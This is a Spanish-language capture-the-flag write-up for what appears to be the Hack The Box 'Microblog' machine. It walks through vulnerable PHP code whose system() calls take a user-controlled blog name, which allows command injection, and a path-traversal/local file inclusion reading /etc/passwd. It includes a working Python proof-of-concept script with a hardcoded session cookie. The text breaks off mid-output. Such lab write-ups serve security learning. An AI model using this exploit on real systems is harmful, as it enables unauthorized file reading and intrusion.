+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1</span><span><span style="color:#fff;font-weight:bold">function</span> addSite($site_name) {
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2</span><span>    <span style="color:#fff;font-weight:bold">if</span>(isset($_SESSION[<span style="color:#0ff;font-weight:bold">&#39;username&#39;</span>])) {
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3</span><span>        <span style="color:#007f7f">//check if site already exists
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4</span><span><span style="color:#007f7f"></span>        $scan = glob(<span style="color:#0ff;font-weight:bold">&#39;/var/www/microblog/*&#39;</span>, GLOB_ONLYDIR);
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5</span><span>        $taken_sites = <span style="color:#fff;font-weight:bold">array</span>();
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6</span><span>        <span style="color:#fff;font-weight:bold">foreach</span>($scan <span style="color:#fff;font-weight:bold">as</span> $site) {
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7</span><span>            array_push($taken_sites, substr($site, strrpos($site, <span style="color:#0ff;font-weight:bold">&#39;/&#39;</span>) + <span style="color:#ff0;font-weight:bold">1</span>));
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8</span><span>        }
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9</span><span>        <span style="color:#fff;font-weight:bold">if</span>(in_array($site_name, $taken_sites)) {
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10</span><span>            header(<span style="color:#0ff;font-weight:bold">&#34;Location: /dashboard?message=Sorry, that site has already been taken&amp;status=fail&#34;</span>);
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11</span><span>            <span style="color:#fff;font-weight:bold">exit</span>;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">12</span><span>        }
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">13</span><span>        $redis = <span style="color:#fff;font-weight:bold">new</span> Redis();
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">14</span><span>        $redis-&gt;<span style="color:#007f7f">connect</span>(<span style="color:#0ff;font-weight:bold">&#39;/var/run/redis/redis.sock&#39;</span>);
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">15</span><span>	$redis-&gt;<span style="color:#007f7f">LPUSH</span>($_SESSION[<span style="color:#0ff;font-weight:bold">&#39;username&#39;</span>] . <span style="color:#0ff;font-weight:bold">&#34;:sites&#34;</span>, $site_name);
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">16</span><span>        $tmp_dir = <span style="color:#0ff;font-weight:bold">&#34;/tmp/&#34;</span> . generateRandomString(<span style="color:#ff0;font-weight:bold">7</span>);
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">17</span><span>        system(<span style="color:#0ff;font-weight:bold">&#34;mkdir -m 0700 &#34;</span> . $tmp_dir);
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">18</span><span>        system(<span style="color:#0ff;font-weight:bold">&#34;cp -r /var/www/microblog-template/* &#34;</span> . $tmp_dir);
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">19</span><span>        system(<span style="color:#0ff;font-weight:bold">&#34;chmod 500 &#34;</span> . $tmp_dir);
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">20</span><span>        system(<span style="color:#0ff;font-weight:bold">&#34;chmod +w /var/www/microblog&#34;</span>);
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">21</span><span>        system(<span style="color:#0ff;font-weight:bold">&#34;cp -rp &#34;</span> . $tmp_dir . <span style="color:#0ff;font-weight:bold">&#34; /var/www/microblog/&#34;</span> . $site_name);
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">22</span><span>	system(<span style="color:#0ff;font-weight:bold">&#34;chmod -w microblog&#34;</span>);
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">23</span><span>	system (<span style="color:#0ff;font-weight:bold">&#34;chmod -R +w &#34;</span> . $tmp_dir);
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">24</span><span>	system(<span style="color:#0ff;font-weight:bold">&#34;rm -r &#34;</span> . $tmp_dir);
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">25</span><span>        header(<span style="color:#0ff;font-weight:bold">&#34;Location: /dashboard?message=Site added successfully!&amp;status=success&#34;</span>);
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">26</span><span>    }
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">27</span><span>    <span style="color:#fff;font-weight:bold">else</span> {
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">28</span><span>        header(<span style="color:#0ff;font-weight:bold">&#34;Location: /dashboard?message=Site not added, authentication failed&amp;status=fail&#34;</span>);
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">29</span><span>    }
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">30</span><span>}</span></span></code></pre></div>
+<ul>
+<li>
+<p><strong>Verificación de sesión:</strong></p>
+<ul>
+<li>La función comienza comprobando si existe una sesión activa (<code>$_SESSION['username']</code>). Si no existe, redirige al usuario al panel de control con un mensaje de error.</li>
+</ul>
+</li>
+<li>
+<p><strong>Verificación de la existencia del sitio:</strong></p>
+<ul>
+<li>Utiliza <code>glob</code> para escanear todos los subdirectorios en <code>/var/www/microblog/</code> y los almacena en un array llamado <code>$taken_sites</code>.</li>
+<li>Comprueba si el nombre del sitio que se está intentando crear (<code>$site_name</code>) ya existe en el array <code>$taken_sites</code>. Si es así, redirige al usuario al panel de control con un mensaje de error indicando que el sitio ya existe.</li>
+</ul>
+</li>
+<li>
+<p><strong>Conexión a Redis:</strong></p>
+<ul>
+<li>Establece una conexión con un servidor Redis usando un socket Unix (<code>/var/run/redis/redis.sock</code>).</li>
+<li>Luego, agrega el nombre del sitio a una lista en Redis que está asociada con el nombre de usuario de la sesión (<code>$_SESSION['username'] . &quot;:sites&quot;</code>).</li>
+</ul>
+</li>
+<li>
+<p><strong>Creación del nuevo sitio:</strong></p>
+<ul>
+<li>Genera un directorio temporal en <code>/tmp/</code> utilizando una cadena aleatoria generada por una función no incluida en el código (<code>generateRandomString(7)</code>).</li>
+<li>Copia los archivos desde una plantilla (<code>/var/www/microblog-template/*</code>) al directorio temporal y ajusta los permisos para que sea de solo lectura.</li>
+<li>Se asegura de que el directorio <code>/var/www/microblog</code> tenga permisos de escritura temporalmente para poder copiar los archivos del directorio temporal al nuevo directorio del sitio.</li>
+<li>Ajusta los permisos del nuevo sitio para que sea de solo lectura y luego elimina el directorio temporal.</li>
+</ul>
+</li>
+<li>
+<p><strong>Redirección final:</strong></p>
+<ul>
+<li>Una vez que se ha creado el sitio, redirige al usuario al panel de control con un mensaje de éxito.</li>
+</ul>
+</li>
+<li>
+<p><strong>Manejo de errores:</strong></p>
+<ul>
+<li>Si no se ha establecido la sesión, la función redirige al usuario con un mensaje de error indicando que la autenticación falló.</li>
+</ul>
+</li>
+</ul>
+<p>Podemos analizar el recurso <code>index.php</code> del directorio <code>edit</code> de la plantilla a ver que encontramos.
+<img src="images/Screenshot_14.png" alt="Write-up Image"></p>
+<p>La función que mas me llama la atención es <code>provisionProUser()</code></p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1</span><span><span style="color:#fff;font-weight:bold">function</span> provisionProUser() {
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2</span><span>    <span style="color:#fff;font-weight:bold">if</span>(isPro() === <span style="color:#0ff;font-weight:bold">&#34;true&#34;</span>) {
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3</span><span>        $blogName = trim(urldecode(getBlogName()));
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4</span><span>        system(<span style="color:#0ff;font-weight:bold">&#34;chmod +w /var/www/microblog/&#34;</span> . $blogName);
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5</span><span>        system(<span style="color:#0ff;font-weight:bold">&#34;chmod +w /var/www/microblog/&#34;</span> . $blogName . <span style="color:#0ff;font-weight:bold">&#34;/edit&#34;</span>);
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6</span><span>        system(<span style="color:#0ff;font-weight:bold">&#34;cp /var/www/pro-files/bulletproof.php /var/www/microblog/&#34;</span> . $blogName . <span style="color:#0ff;font-weight:bold">&#34;/edit/&#34;</span>);
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7</span><span>        system(<span style="color:#0ff;font-weight:bold">&#34;mkdir /var/www/microblog/&#34;</span> . $blogName . <span style="color:#0ff;font-weight:bold">&#34;/uploads &amp;&amp; chmod 700 /var/www/microblog/&#34;</span> . $blogName . <span style="color:#0ff;font-weight:bold">&#34;/uploads&#34;</span>);
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8</span><span>        system(<span style="color:#0ff;font-weight:bold">&#34;chmod -w /var/www/microblog/&#34;</span> . $blogName . <span style="color:#0ff;font-weight:bold">&#34;/edit &amp;&amp; chmod -w /var/www/microblog/&#34;</span> . $blogName);
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9</span><span>    }
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10</span><span>    <span style="color:#fff;font-weight:bold">return</span>;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11</span><span>}</span></span></code></pre></div>
+<p>Si consiguiéramos llamar a esta función y controlásemos el nombre del blog, podríamos inyectar un comando a nivel de sistema.</p>
+<h2 id="local-file-inclusion">Local File Inclusion</h2>
+<p>Al seguir enumerando me di cuenta de que al agregar un texto o un encabezado, escribe el texto en <code>../content/order.txt</code>
+<img src="images/Screenshot_15.png" alt="Write-up Image">
+Vemos la siguiente línea <code>$post_file = fopen(&quot;{$_POST['id']}&quot;, &quot;w&quot;);</code></p>
+<p>La función <code>fopen</code> abre un archivo. El primer argumento es el nombre del archivo que se desea abrir, que en este caso es el valor de <code>$_POST['id']</code>. El segundo argumento <code>&quot;w&quot;</code> indica que el archivo se abre en modo de escritura (<code>write</code>). Si el archivo no existe, <code>fopen</code> intentará crearlo; si ya existe, truncará su contenido, es decir, borrará cualquier contenido anterior.</p>
+<p>Por lo cual podríamos intentar leer un archivo no autorizado ya que nosotros controlamos el parámetro <code>id</code></p>
+<p>Al intentar editar nuestro blog nos encontramos lo siguiente.
+<img src="images/Screenshot_16.png" alt="Write-up Image"></p>
+<p>¿De donde ha salido este <code>id</code>?</p>
+<p>Vemos que estaba hardcodeado en el código.
+<img src="images/Screenshot_17.png" alt="Write-up Image"></p>
+<p>Vemos que esto funciona, por detrás se carga el archivo y se guarda la ruta en <code>orders.txt</code>, acto seguido la carga por lo cual tenemos un LFI.
+<img src="images/Screenshot_18.png" alt="Write-up Image"></p>
+<p>Podemos comprobar el valor de <code>order.txt</code> de nuestro blog vemos que está el Path Traversal / Local File Inclusion ahí.</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>$ curl http://test.microblog.htb/content/order.txt
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>hm5yhgl36el
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3</span><span>../../../../../../../../../etc/passwd
+</span></span></code></pre></div>
+<p>Hay que tener en cuenta de que se intenta crear el archivo con el nombre, por lo cual podríamos intentar crear un archivo con la extensión PHP (ya que controlamos el nombre de archivo completamente) para intentar insertar contenido malicioso e intentar ejecutar comandos a nivel de sistema. <strong>No funciona</strong></p>
+<p>Para ello voy a crear un pequeño script en Python para automatizar esta vulnerabilidad.</p>
+<p>Se que puede estar mas resumido y me he comido mucho la cabeza pero existe un problema, y es que si se mostrase el output en forma de HTML no habría problema sin embargo se muestra dentro de un script en Javascript, por lo cual habría que usar <code>Selenium</code> por ejemplo para renderizar la página y a partir de ahí utilizar el arbol DOM generado para filtrar por el contenido.</p>
+<p>Pero como no tengo <code>Selenium</code> y no quería instalarlo lo quería hacer con simples expresiones regulares.</p>
+<p>Script:</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1</span><span><span style="color:#007f7f">#!/usr/bin/python3</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2</span><span><span style="color:#fff;font-weight:bold">import</span> requests
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3</span><span><span style="color:#fff;font-weight:bold">import</span> signal
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4</span><span><span style="color:#fff;font-weight:bold">import</span> re
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6</span><span>SUBDOMAIN_URL=<span style="color:#0ff;font-weight:bold">&#34;http://test.microblog.htb/&#34;</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7</span><span>URL = <span style="color:#0ff;font-weight:bold">&#34;http://test.microblog.htb/edit/index.php&#34;</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8</span><span>FILE_URL = <span style="color:#0ff;font-weight:bold">&#34;http://test.microblog.htb/content/order.txt&#34;</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9</span><span>USERNAME_COOKIE = <span style="color:#0ff;font-weight:bold">&#34;97vle27go9t2gt324n5dqre1n7&#34;</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11</span><span><span style="color:#fff;font-weight:bold">def</span> def_handler(x,y):
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">12</span><span>    <span style="color:#fff;font-weight:bold">print</span>(<span style="color:#0ff;font-weight:bold">&#34;</span><span style="color:#0ff;font-weight:bold">\n</span><span style="color:#0ff;font-weight:bold">[i] Saliendo...&#34;</span>)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">13</span><span>    exit(<span style="color:#ff0;font-weight:bold">1</span>)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">14</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">15</span><span>signal.signal(signal.SIGINT, def_handler)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">16</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">17</span><span><span style="color:#fff;font-weight:bold">def</span> set_file(file_name):
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">18</span><span>    cookies = {<span style="color:#0ff;font-weight:bold">&#34;username&#34;</span>: USERNAME_COOKIE}
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">19</span><span>    data = {<span style="color:#0ff;font-weight:bold">&#34;id&#34;</span>: file_name, <span style="color:#0ff;font-weight:bold">&#34;header&#34;</span>: <span style="color:#0ff;font-weight:bold">&#34;test&#34;</span>}
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">20</span><span>    r = requests.post(URL, cookies=cookies, data=data)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">21</span><span>    
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">22</span><span><span style="color:#fff;font-weight:bold">def</span> lfi(file_name):
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">23</span><span>    set_file(file_name)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">24</span><span>    r = requests.get(FILE_URL)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">25</span><span>    <span style="color:#007f7f"># Comprobar que el archivoe está en /content/order.txt</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">26</span><span>    <span style="color:#fff;font-weight:bold">if</span> file_name in r.text:
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">27</span><span>        r = requests.get(SUBDOMAIN_URL)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">28</span><span>        content = r.content.decode(<span style="color:#0ff;font-weight:bold">&#34;utf-8&#34;</span>)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">29</span><span>        name = get_regexp(file_name)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">30</span><span>        pos = content.find(name)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">31</span><span>        end_pattern = <span style="color:#0ff;font-weight:bold">&#34;&lt;</span><span style="color:#0ff;font-weight:bold">\\</span><span style="color:#0ff;font-weight:bold">/div&gt;&#34;</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">32</span><span>        segment = content[pos:]
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">33</span><span>        final_pos_in_segment = segment.find(end_pattern)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">34</span><span>        final_pos = pos + final_pos_in_segment + <span style="color:#fff;font-weight:bold">len</span>(end_pattern)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">35</span><span>        <span style="color:#fff;font-weight:bold">print</span>(content[pos:final_pos])
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">36</span><span>    <span style="color:#fff;font-weight:bold">else</span>:
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">37</span><span>        <span style="color:#fff;font-weight:bold">print</span>(<span style="color:#0ff;font-weight:bold">&#34;[x] No se ha encontrado el archivo, revisa que no se haya borrado el blog&#34;</span>)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">38</span><span>        exit(<span style="color:#ff0;font-weight:bold">1</span>)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">39</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">40</span><span><span style="color:#fff;font-weight:bold">def</span> get_regexp(file_name):
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">41</span><span>    file = file_name.replace(<span style="color:#0ff;font-weight:bold">&#34;../&#34;</span>, <span style="color:#0ff;font-weight:bold">&#34;&#34;</span>)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">42</span><span>    striped_file = file.strip(<span style="color:#0ff;font-weight:bold">&#34;/&#34;</span>).split(<span style="color:#0ff;font-weight:bold">&#34;/&#34;</span>)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">43</span><span>    final_name = <span style="color:#0ff;font-weight:bold">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">44</span><span>    i = <span style="color:#ff0;font-weight:bold">0</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">45</span><span>    <span style="color:#fff;font-weight:bold">for</span> s in striped_file:
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">46</span><span>        final_name += s + <span style="color:#0ff;font-weight:bold">&#34;</span><span style="color:#0ff;font-weight:bold">\\</span><span style="color:#0ff;font-weight:bold">/&#34;</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">47</span><span>    <span style="color:#fff;font-weight:bold">return</span> final_name[:-<span style="color:#ff0;font-weight:bold">1</span>] + <span style="color:#0ff;font-weight:bold">&#34;</span><span style="color:#0ff;font-weight:bold">\&#34;</span><span style="color:#0ff;font-weight:bold">&gt;&#34;</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">48</span><span>    
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">49</span><span><span style="color:#fff;font-weight:bold">if</span> __name__ == <span style="color:#0ff;font-weight:bold">&#34;__main__&#34;</span>:
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">50</span><span>    <span style="color:#fff;font-weight:bold">while</span> <span style="color:#fff;font-weight:bold">True</span>:
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">51</span><span>        name = <span style="color:#fff;font-weight:bold">input</span>(<span style="color:#0ff;font-weight:bold">&#34;Archivo: &#34;</span>)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">52</span><span>        lfi(name)</span></span></code></pre></div>
+<p>Output:</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>$ python3 poc.py 
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>Archivo: ../../../../../../etc/hostname
